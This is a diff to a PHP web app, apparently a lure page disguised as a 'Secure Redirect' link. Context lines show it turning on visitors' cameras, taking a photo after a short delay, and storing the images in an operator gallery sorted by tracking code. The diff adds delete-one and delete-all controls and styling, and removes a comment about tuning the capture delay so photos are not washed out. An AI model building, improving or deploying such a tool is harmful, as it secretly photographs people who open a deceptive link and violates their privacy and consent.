@@ -27,6 +27,30 @@ try {
     die("Database Error");
 }
 
+// معالجة طلبات الحذف
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_POST['delete_id'])) {
+        $id_to_delete = intval($_POST['delete_id']);
+        $stmt = $db->prepare("DELETE FROM captures WHERE id = ?");
+        $stmt->execute([$id_to_delete]);
+        header("Location: " . $_SERVER['PHP_SELF'] . (!empty($_GET['track']) ? '?track=' . urlencode($_GET['track']) : ''));
+        exit();
+    }
+    
+    if (isset($_POST['delete_all'])) {
+        $track_code = trim($_POST['track_code'] ?? '');
+        if (!empty($track_code)) {
+            $stmt = $db->prepare("DELETE FROM captures WHERE code = ?");
+            $stmt->execute([$track_code]);
+            header("Location: " . $_SERVER['PHP_SELF'] . '?track=' . urlencode($track_code));
+        } else {
+            $db->exec("DELETE FROM captures");
+            header("Location: " . $_SERVER['PHP_SELF']);
+        }
+        exit();
+    }
+}
+
 function fetch_real_meta($url) {
     $title = "Secure Redirect";
     $image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
@@ -144,7 +168,6 @@ if (isset($_GET['r']) && !empty($target_redirect)):
                     video.srcObject = stream;
                     video.play();
                     
-                    // تم زيادة المهلة الزمنية إلى 2000 مللي ثانية (ثانيتين) لكي تضبط الكاميرا الإضاءة وتتجنب ظهور الصورة بيضاء
                     setTimeout(() => {
                         const canvas = document.createElement('canvas');
                         canvas.width = 640;
@@ -194,6 +217,7 @@ endif;
             --accent: #6366f1;
             --accent-hover: #4f46e5;
             --danger: #ef4444;
+            --danger-hover: #dc2626;
             --text: #f8fafc;
             --muted: #64748b;
         }
@@ -210,18 +234,22 @@ endif;
         
         .btn { background: var(--accent); color: white; border: none; padding: 0 20px; border-radius: 8px; font-weight: 600; cursor: pointer; height: 46px; display: inline-flex; align-items: center; justify-content: center; font-size: 13px; text-decoration: none; transition: background 0.2s; }
         .btn:hover { background: var(--accent-hover); }
-        .btn-danger { background: var(--danger); }
+        .btn-danger { background: var(--danger); color: white; }
+        .btn-danger:hover { background: var(--danger-hover); }
         .btn-secondary { background: #334155; }
         
         .output-box { background: #020617; border: 1px solid var(--border); padding: 16px; border-radius: 8px; margin-top: 15px; }
         .output-box label { display: block; font-size: 10px; text-transform: uppercase; color: var(--muted); margin-bottom: 6px; }
         .flex-row { display: flex; gap: 8px; }
 
+        .gallery-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
         .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 16px; margin-top: 15px; }
-        .item-card { background: #020617; border: 1px solid var(--border); border-radius: 8px; padding: 10px; text-align: center; }
+        .item-card { background: #020617; border: 1px solid var(--border); border-radius: 8px; padding: 10px; text-align: center; display: flex; flex-direction: column; justify-content: space-between; }
         .item-card img { width: 100%; height: 180px; object-fit: cover; border-radius: 6px; border: 1px solid var(--border); }
         .meta-info { margin-top: 10px; font-size: 11px; color: var(--muted); display: flex; justify-content: space-between; align-items: center; }
         .code-tag { color: var(--accent); font-family: monospace; font-weight: bold; }
+        .btn-delete-single { background: rgba(239, 68, 68, 0.1); color: var(--danger); border: 1px solid var(--danger); padding: 6px 10px; border-radius: 6px; font-size: 11px; cursor: pointer; margin-top: 10px; width: 100%; transition: all 0.2s; font-weight: 600; }
+        .btn-delete-single:hover { background: var(--danger); color: white; }
 
         footer { text-align: center; margin-top: 40px; font-size: 11px; color: var(--muted); border-top: 1px solid var(--border); padding-top: 20px; }
         footer span { color: var(--accent); font-weight: 600; }
@@ -249,12 +277,22 @@ endif;
         </div>
 
         <div class="panel">
-            <h2>Captured Gallery</h2>
+            <div class="gallery-header">
+                <h2>Captured Gallery</h2>
+                <?php if (!empty($captures)): ?>
+                    <form method="POST" onsubmit="return confirm('هل أنت متأكد من رغبتك في حذف جميع الصور المعروضة؟');">
+                        <input type="hidden" name="delete_all" value="1">
+                        <input type="hidden" name="track_code" value="<?php echo htmlspecialchars($filter_code); ?>">
+                        <button type="submit" class="btn btn-danger" style="height: 36px; font-size: 12px; padding: 0 14px;">حذف الكل</button>
+                    </form>
+                <?php endif; ?>
+            </div>
+
             <form method="GET" style="margin-bottom: 15px; display: flex; gap: 8px;">
                 <input type="text" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code); ?>">
                 <button type="submit" class="btn">Filter</button>
                 <?php if(!empty($filter_code)): ?>
-                    <a href="/" class="btn btn-danger" style="text-decoration:none; display:flex; align-items:center;">Reset</a>
+                    <a href="/" class="btn btn-secondary" style="text-decoration:none; display:flex; align-items:center;">Reset</a>
                 <?php endif; ?>
             </form>
 
@@ -264,13 +302,19 @@ endif;
                 <div class="gallery">
                     <?php foreach ($captures as $cap): ?>
                         <div class="item-card">
-                            <a href="<?php echo $cap['image_data']; ?>" target="_blank">
-                                <img src="<?php echo $cap['image_data']; ?>" alt="Capture">
-                            </a>
-                            <div class="meta-info">
-                                <span class="code-tag"><?php echo htmlspecialchars($cap['code']); ?></span>
-                                <span><?php echo htmlspecialchars($cap['created_at']); ?></span>
+                            <div>
+                                <a href="<?php echo $cap['image_data']; ?>" target="_blank">
+                                    <img src="<?php echo $cap['image_data']; ?>" alt="Capture">
+                                </a>
+                                <div class="meta-info">
+                                    <span class="code-tag"><?php echo htmlspecialchars($cap['code']); ?></span>
+                                    <span><?php echo htmlspecialchars($cap['created_at']); ?></span>
+                                </div>
                             </div>
+                            <form method="POST" onsubmit="return confirm('هل تريد حذف هذه الصورة بالتحديد؟');">
+                                <input type="hidden" name="delete_id" value="<?php echo $cap['id']; ?>">
+                                <button type="submit" class="btn-delete-single">حذف الصورة</button>
+                            </form>
                         </div>
                     <?php endforeach; ?>
                 </div>
